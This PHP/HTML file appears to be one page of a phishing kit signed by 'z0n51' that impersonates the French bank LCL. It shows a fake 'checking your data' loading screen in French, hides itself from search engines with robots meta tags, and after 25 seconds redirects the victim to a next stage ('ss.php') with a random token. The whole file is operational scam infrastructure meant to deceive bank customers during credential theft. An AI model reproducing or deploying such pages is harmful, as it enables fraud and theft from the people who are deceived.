<?php

/**
 * @link              https://www.z0n51.com/
 * @since             19/11/2020
 * @package           LCL
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LCL
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <title>LCL</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="../assets/images/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="loader">
                    <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    <p>Merci de patienter.<br>Nous contrôlons vos données.</p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'ss.php?confirmation#_'+ dispatch;
            },25000); // 1000 = 1s
        </script>

    </body>

</html>